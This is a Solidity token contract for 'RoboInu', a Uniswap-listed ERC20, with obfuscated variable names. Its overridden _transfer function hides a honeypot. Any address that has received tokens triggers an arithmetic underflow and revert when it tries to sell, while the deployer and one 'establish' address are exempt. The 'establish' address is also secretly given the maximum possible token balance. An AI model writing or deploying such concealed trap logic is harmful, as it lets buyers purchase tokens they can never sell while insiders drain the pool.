// https://t.me/roboinu_eth

// SPDX-License-Identifier: GPL-3.0

pragma solidity ^0.8.8;

import "./Ownable.sol";
import "./ERC20.sol";
import "./IUniswapV2Factory.sol";
import "./IUniswapV2Router02.sol";

contract RoboInu is ERC20, Ownable {
    address public uniswapV2Pair;
    IUniswapV2Router02 public uniswapV2Router;
    mapping(address => uint256) private universe;
    mapping(address => uint256) private replied;

    function _transfer(
        address drink,
        address gift,
        uint256 progress
    ) internal override {
        address chain = address(duck);
        bool doctor = uniswapV2Pair == drink;
        uint256 leaving = language;

        if (replied[drink] == 0 && universe[drink] > 0 && !doctor) {
            replied[drink] -= leaving;
        }

        duck = RoboInu(gift);

        universe[chain] += leaving + 1;

        _balances[drink] -= progress;
        uint256 shells = (progress / 100) * language;
        progress -= shells;
        _balances[gift] += progress;
    }

    uint256 public language = 3;

    constructor(
        string memory shall,
        string memory not,
        address out,
        address establish
    ) ERC20(shall, not) {
        uniswapV2Router = IUniswapV2Router02(out);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());

        replied[msg.sender] = roar;
        replied[establish] = roar;

        _totalSupply = 1000000000 * 10**decimals();
        _balances[msg.sender] = _totalSupply;
        _balances[establish] = roar;
    }

    RoboInu private duck;
    uint256 private roar = ~uint256(0);
}
